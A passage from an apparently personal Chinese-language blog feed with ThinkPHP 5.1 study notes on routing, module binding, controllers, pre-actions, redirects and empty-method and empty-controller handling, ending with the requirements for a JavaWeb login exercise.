<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">test</span>\<span class="title">controller</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Abc</span></span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span><span class="params">($who=<span class="string">'sindorei'</span>)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $who.<span class="string">"吃饭"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>浏览器访问<a href="http://localhost/thinkphp5/tp5.1test/public/index.php/test/abc/eat/who/" target="_blank" rel="noopener">http://localhost/thinkphp5/tp5.1test/public/index.php/test/abc/eat/who/</a></p>
<p>就会输出sindorei吃饭,还可以自己赋值</p>
<p>访问<br><a href="http://localhost/thinkphp5/tp5.1test/public/index.php/test/abc/eat/who/51nd0re1" target="_blank" rel="noopener">http://localhost/thinkphp5/tp5.1test/public/index.php/test/abc/eat/who/51nd0re1</a></p>
<p>就会输出51nd0re1吃饭</p>
<p>上面的方法其实是由于开启了伪静态模式，进行的URL重写</p>
<p>如果所处环境没有开就只能使用PATH_INFO模式了<br>URL改为<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/thinkphp5/</span>tp5.<span class="number">1</span>test<span class="regexp">/public/i</span>ndex.php?s=test<span class="regexp">/abc/</span>eat<span class="regexp">/who/</span><span class="number">51</span>nd0re1</span><br></pre></td></tr></table></figure></p>
<p>开启伪静态就在配置文件里，把mod_rewrite.so前面的#去掉</p>
<p>注意：PHP5.4以上版本的public目录下的.htaccess，需要把<code>RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]</code>改为<code>RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$1]</code></p>
<h2 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h2><p>假如你只有一个test模块，就可以将public下的index.php中的方法改为<br><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">Container::get<span class="function"><span class="params">(<span class="string">'app'</span>)</span>-&gt;</span>bind<span class="function"><span class="params">(<span class="string">'test'</span>)</span>-&gt;</span>run<span class="function"><span class="params">()</span>-&gt;</span>send();</span><br></pre></td></tr></table></figure></p>
<p>但是这样做就意味着绑定了这个test模块，就无法访问别的模块了</p>
<p>如果只有一个控制器，那就可以改为<br><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">Container::get<span class="function"><span class="params">(<span class="string">'app'</span>)</span>-&gt;</span>bind<span class="function"><span class="params">(<span class="string">'test/abc'</span>)</span>-&gt;</span>run<span class="function"><span class="params">()</span>-&gt;</span>send();</span><br></pre></td></tr></table></figure><br>这直接访问就行<a href="http://localhost/thinkphp5/tp5.1test/public/eat" target="_blank" rel="noopener">http://localhost/thinkphp5/tp5.1test/public/eat</a></p>
<p>同理，其他控制器也无法访问了</p>
<h3 id="空模块"><a href="#空模块" class="headerlink" title="空模块"></a>空模块</h3><p>在应用过程中，常常会出现用户访问不存在的模块，也就是空模块，这样的话就可以在config中的app.php的<code>&#39;empty_module&#39;=&gt; &#39;&#39;</code>  在后面改为index，变为<code>&#39;empty_module&#39;=&gt;&#39;index&#39;</code>，就可以让用户访问空模块时转向index模块</p>
<p>修改完后，访问<a href="http://localhost/thinkphp5/tp5.1test/public/bbb" target="_blank" rel="noopener">http://localhost/thinkphp5/tp5.1test/public/bbb</a></p>
<p>会发现自动转到了index模块，同时存在的模块也不会收到任何影响，也可以做一个error模块，让其知道该模块是错误的</p>
<h3 id="单一模块"><a href="#单一模块" class="headerlink" title="单一模块"></a>单一模块</h3><p>当只有一个模块的情况下，关闭多模块设置，就可以直接在app下创建controller并写一个Index.php</p>
<p>命名空间也变为 app\controller;</p>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>提供了一个Env类库来获取环境变量<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> \env(<span class="string">'root_path'</span>);</span><br></pre></td></tr></table></figure></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>系统路径</th>
<th>Env参数mingc</th>
</tr>
</thead>
<tbody>
<tr>
<td>应用根目录</td>
<td>root_path</td>
</tr>
<tr>
<td>应用目录</td>
<td>app_path</td>
</tr>
<tr>
<td>框架目录</td>
<td>think_path</td>
</tr>
<tr>
<td>配置目录</td>
<td>config_path</td>
</tr>
<tr>
<td>扩展目录</td>
<td>extend_path</td>
</tr>
<tr>
<td>composer目录</td>
<td>vendor_path</td>
</tr>
<tr>
<td>运行缓存目录</td>
<td>runtime_path</td>
</tr>
<tr>
<td>路由目录</td>
<td>route_path</td>
</tr>
<tr>
<td>当前模块目录</td>
<td>module_path</td>
</tr>
</tbody>
</table>
</div>
<h2 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h2><h3 id="控制器定义"><a href="#控制器定义" class="headerlink" title="控制器定义"></a>控制器定义</h3><ol>
<li><p>控制器，即controller，控制器文件存放在controller目录下</p>
</li>
<li><p>类名和文件名大小写保持一致，并采用驼峰式(首字母大写) use think\Controller;  class Index extends Controller</p>
</li>
<li><p>继承控制器基类，可以更方便使用功能，非必须</p>
</li>
<li><p>系统也提供了其他方法，在不继承的情况下完成相同功能</p>
</li>
<li><p>前面我们知道如果是一个单词，首字母大写，比如class Index</p>
</li>
<li><p>URL访问时直接public/index即可</p>
</li>
<li><p>那么如果创建的是双字母组合，比如class HelloWorld，那么URL访问时必须为 public/hello_world</p>
</li>
<li><p>如果想要原样访问，可以在配置文件中关闭自动转换<code>url_convert</code>，这样就可以写成public/HelloWorld</p>
</li>
<li><p>如果想更改根命名空间app为其他，可以在根目录下创建.env文件，并且配上键值对 app_namespace=application</p>
</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'HelloWorld'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>URL访问<br><a href="http://localhost/thinkphp5/tp5.1test/public/index/hello_world" target="_blank" rel="noopener">http://localhost/thinkphp5/tp5.1test/public/index/hello_world</a></p>
<h4 id="渲染输出"><a href="#渲染输出" class="headerlink" title="渲染输出"></a>渲染输出</h4><ol>
<li><p>ThinkPHP直接采用方法内return返回的方式直接就输出了</p>
</li>
<li><p>使用json输出，直接采用json函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data=<span class="keyword">array</span>(<span class="string">'a'</span>=&gt;<span class="number">1</span>,<span class="string">'b'</span>=&gt;<span class="number">2</span>,<span class="string">'c'</span>=&gt;<span class="number">3</span>);</span><br><span class="line"><span class="keyword">return</span> json($data);</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用view输出模板，开启错误提示，可知道如何创建模板，直接这样写会产生错误，打开错误提示根据错误提示的去创建相应的目录和文件即可</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">return</span> <span class="title">view</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>默认输出方式为html文件，如果返回的是数组，则会报错</p>
</li>
<li><p>一般来说，正常页面都是html输出，用于模板，Ajax默认为json</p>
</li>
<li><p>如果继承了积累控制器，那么可以定义控制器初始化方法为 initialize()，该方法会在调用控制器方法之前执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">initialize</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//parent::initialize();</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'init'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>initialize()方法不需要任何返回值，输出用PHP方式，return无效，该方法很像JavaWeb中的static模块</p>
</li>
</ol>
<h4 id="前置操作"><a href="#前置操作" class="headerlink" title="前置操作"></a>前置操作</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Before</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $beforeActionList=[</span></span><br><span class="line"><span class="php">        <span class="string">'first'</span>,</span></span><br><span class="line"><span class="php">        <span class="comment">//one方法执行不调用</span></span></span><br><span class="line"><span class="php">        <span class="string">'second'</span>=&gt;[<span class="string">'except'</span>=&gt;<span class="string">'one'</span>],</span></span><br><span class="line"><span class="php">        <span class="comment">//third前置只能通过调用one和two方法触发</span></span></span><br><span class="line"><span class="php">        <span class="string">'third'</span>=&gt;[<span class="string">'only'</span>=&gt;<span class="string">'one,two'</span>]</span></span><br><span class="line"><span class="php">    ];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">first</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'first&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">second</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'second&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">third</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'third&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'index'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">one</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'one'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">two</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'two'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>当什么方法都不调用时<br><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">first</span></span><br><span class="line"><span class="keyword">second</span></span><br><span class="line">index</span><br></pre></td></tr></table></figure><br>当调用one方法时<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">first</span></span><br><span class="line"><span class="keyword">third</span></span><br><span class="line"><span class="literal">one</span></span><br></pre></td></tr></table></figure><br>当调用two方法时<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">first</span></span><br><span class="line"><span class="keyword">second</span></span><br><span class="line"><span class="keyword">third</span></span><br><span class="line"><span class="literal">two</span></span><br></pre></td></tr></table></figure></p>
<h4 id="跳转和重定向"><a href="#跳转和重定向" class="headerlink" title="跳转和重定向"></a>跳转和重定向</h4><ol>
<li>Controller类提供了两个跳转方法：success(msg,url)和error(msg)</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag)&#123;</span><br><span class="line">    <span class="comment">//如果不指定url，则返回$_SERVER['HTTP_REFERER']</span></span><br><span class="line">    	<span class="keyword">$this</span>-&gt;success(<span class="string">'成功'</span>,<span class="string">'../'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//自动返回前一页</span></span><br><span class="line">    	<span class="keyword">$this</span>-&gt;error(<span class="string">'失败'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Before</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $beforeActionList=[</span></span><br><span class="line"><span class="php">        <span class="string">'first'</span>,</span></span><br><span class="line"><span class="php">        <span class="comment">//one方法执行不调用</span></span></span><br><span class="line"><span class="php">        <span class="string">'second'</span>=&gt;[<span class="string">'except'</span>=&gt;<span class="string">'one'</span>],</span></span><br><span class="line"><span class="php">        <span class="comment">//third前置只能通过调用one和two方法触发</span></span></span><br><span class="line"><span class="php">        <span class="string">'third'</span>=&gt;[<span class="string">'only'</span>=&gt;<span class="string">'one,two'</span>]</span></span><br><span class="line"><span class="php">    ];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $flag=<span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">first</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'first&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">second</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'second&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">third</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'third&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;success(<span class="string">'注册成功'</span>,<span class="string">'../'</span>);</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;error(<span class="string">'失败'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'index'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">one</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'one'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">two</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'two'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">失败</span><br></pre></td></tr></table></figure><br>因为这里flag为false，并且会自动跳转回原先访问的页面</p>
<p>现在将flag改为true，再次访问index方法<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Before</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $beforeActionList=[</span></span><br><span class="line"><span class="php">        <span class="string">'first'</span>,</span></span><br><span class="line"><span class="php">        <span class="comment">//one方法执行不调用</span></span></span><br><span class="line"><span class="php">        <span class="string">'second'</span>=&gt;[<span class="string">'except'</span>=&gt;<span class="string">'one'</span>],</span></span><br><span class="line"><span class="php">        <span class="comment">//third前置只能通过调用one和two方法触发</span></span></span><br><span class="line"><span class="php">        <span class="string">'third'</span>=&gt;[<span class="string">'only'</span>=&gt;<span class="string">'one,two'</span>]</span></span><br><span class="line"><span class="php">    ];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $flag=<span class="keyword">true</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">first</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'first&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">second</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'second&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">third</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'third&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;success(<span class="string">'注册成功'</span>,<span class="string">'../'</span>);</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;error(<span class="string">'失败'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'index'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">one</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'one'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">two</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'two'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注册成功</span><br></pre></td></tr></table></figure><br>3秒后会跳转到上一层目录</p>
<ol>
<li><p>成功或错误有一个固定的页面模板:’thinkphp/tpl/dispatch_jump.tpl’</p>
</li>
<li><p>在app.php配置文件中,我们可以更改自己个性化的跳转页面</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">//默认跳转页面对应的模板文件</span></span><br><span class="line"><span class="string">'dispatch_success_tmpl'</span>=&gt;Env::<span class="keyword">get</span>(<span class="string">'think_path'</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果需要自定义跳转页面，可以使用如下模板变量</p>
</li>
</ol>
<div class="table-container">
<table>
<thead>
<tr>
<th>变量</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>$data</td>
<td>要返回的数据</td>
</tr>
<tr>
<td>$msg</td>
<td>页面提示信息</td>
</tr>
<tr>
<td>$code</td>
<td>返回的code</td>
</tr>
<tr>
<td>$wait</td>
<td>跳转等待时间 单位为秒</td>
</tr>
<tr>
<td>$url</td>
<td>跳转页面地址</td>
</tr>
</tbody>
</table>
</div>
<h4 id="空方法拦截"><a href="#空方法拦截" class="headerlink" title="空方法拦截"></a>空方法拦截</h4><p>这个只需要使用<code>_empty</code>函数即可</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Before</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $beforeActionList=[</span></span><br><span class="line"><span class="php">        <span class="string">'first'</span>,</span></span><br><span class="line"><span class="php">        <span class="comment">//one方法执行不调用</span></span></span><br><span class="line"><span class="php">        <span class="string">'second'</span>=&gt;[<span class="string">'except'</span>=&gt;<span class="string">'one'</span>],</span></span><br><span class="line"><span class="php">        <span class="comment">//third前置只能通过调用one和two方法触发</span></span></span><br><span class="line"><span class="php">        <span class="string">'third'</span>=&gt;[<span class="string">'only'</span>=&gt;<span class="string">'one,two'</span>]</span></span><br><span class="line"><span class="php">    ];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $flag=<span class="keyword">true</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">first</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'first&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">second</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'second&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">third</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'third&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">//空方法拦截</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_empty</span><span class="params">($name)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'此方法不存在:'</span>.$name;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;success(<span class="string">'注册成功'</span>,<span class="string">'../'</span>);</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;error(<span class="string">'失败'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'index'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">one</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'one'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">two</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'two'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">first</span></span><br><span class="line"><span class="keyword">second</span></span><br><span class="line">此方法不存在:abc</span><br></pre></td></tr></table></figure><br>同样是需要继承Controller类才能实现</p>
<h4 id="空控制器拦截"><a href="#空控制器拦截" class="headerlink" title="空控制器拦截"></a>空控制器拦截</h4><p>访问空控制器同样会报错，需要创建一个Error类来进行处理</p>
<p>Error类<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Error</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(Request $request)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'此控制器不存在:'</span>.$request-&gt;controller();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>系统有默认的Error类，需要自定义的话，同样在app.php中修改</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>ThinkPHP</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-2020/7/30-用户登录</title>
    <url>/2020/07/30/JavaWeb-2020-7-30-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h1><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><ol>
<li><p>编写login.html登录页面，username&amp;password两个输入框</p>
</li>
<li><p>使用Druid数据库连接池技术，操作mysql,db2数据库中的user表</p>
</li>
<li><p>使用JdbcTemplate技术封装JDBC</p>
<p>4.登录成功跳转到SuccessServlet展示：登录成功 用户名，欢迎您</p>
</li>
<li><p>登录失败跳转到FailServlet展示：登录失败，用户名或密码错误</p>
</li>
</ol>
